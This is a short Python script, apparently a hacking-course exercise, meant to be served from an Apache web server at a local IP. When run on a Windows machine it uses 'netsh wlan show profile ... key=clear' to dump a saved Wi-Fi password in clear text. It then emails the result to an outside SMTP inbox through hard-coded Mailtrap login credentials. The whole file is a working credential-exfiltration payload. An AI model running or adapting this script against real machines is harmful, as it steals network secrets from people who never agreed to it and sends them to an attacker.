# cp execute_command.py /var/www/html/evil-files
# service apache2 start
# http://10.0.2.13/evil-files/

import subprocess
import smtplib


def send_mail(username, password, email, message):
    server = smtplib.SMTP('smtp.mailtrap.io', 2525)
    server.starttls()
    server.login(username, password)
    server.sendmail(email, email, message)  # sender, receiver, message
    server.quit()


command = 'netsh wlan show profile ASUS_E8_2G key=clear'
result = subprocess.check_output(command, shell=True)
send_mail('b06ffc432e3884', 'a5e72032e9c491', 'to@smtp.mailtrap.io', result)
